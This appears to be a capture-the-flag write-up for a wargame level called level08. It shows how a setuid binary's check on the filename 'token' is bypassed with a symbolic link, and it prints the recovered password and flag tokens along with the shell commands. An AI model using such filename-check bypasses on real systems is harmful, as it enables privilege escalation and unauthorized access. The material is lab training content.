@@ -1,0 +1,41 @@
+fiumuikeil55xe9cu4dood66h
+
+<- ls
+-> level08 token
+
+We got an executable that read a file and do something.
+
+Let's try with the token.
+
+<- ./level08 token
+-> You may not access 'token'
+
+Mmh, it's a bit odd, because they're both from the same user as our find call prove it.
+
+<- find . -user flag08
+-> ./level08
+-> ./token
+
+We see the string "token" followed by "You may not access '%s'".
+Dissassembling the main function witch gdb we see a cmp followed to a jump to the step next of an exit call.
+Seems that it won't read any file with the name "token".
+Check it out.
+
+<- echo "popipo" > /tmp/token
+<- ./level08 /tmp/token
+-> You may not access '/tmp/token'
+
+Yup, that not a permission fault.
+A simple link will do the work:
+
+<- ln -s ~/token /tmp/popipo
+<- ./level08 /tmp/popipo
+-> quif5eloekouj29ke0vouxean
+
+No don't go so fast, it's not the password for level09.
+
+<- su flag08
+<- quif5eloekouj29ke0vouxean
+-> Don't forget to launch getflag !
+<- getflag
+-> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
